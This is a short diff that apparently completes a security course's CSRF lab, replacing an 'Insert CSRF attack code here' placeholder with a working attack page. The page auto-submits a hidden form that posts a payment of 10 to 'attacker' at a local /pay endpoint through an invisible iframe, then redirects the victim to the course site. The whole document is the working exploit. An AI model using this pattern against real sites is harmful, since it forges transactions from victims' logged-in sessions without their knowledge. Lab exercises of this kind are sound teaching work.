@@ -1,6 +1,28 @@
 <!DOCTYPE html>
 <html>
+  <form
+    action="http://localhost:8080/pay"
+    method="post"
+    target="malicious_frame"
+  >
+    <div>
+      <input type="hidden" name="recipient" value="attacker" />
+      <input type="hidden" name="amount" value="10" />
+    </div>
+  </form>
 
-<!-- Insert CSRF attack code here -->
+  <iframe
+    name="malicious_frame"
+    id="malicious_frame"
+    style="visibility: hidden"
+  >
+  </iframe>
 
+  <script>
+    document.forms[0].submit();
+    const maliciousFrame = document.getElementById("malicious_frame");
+    maliciousFrame.addEventListener("load", (e) => {
+      window.location.href = "https://cs5435.github.io/";
+    });
+  </script>
 </html>
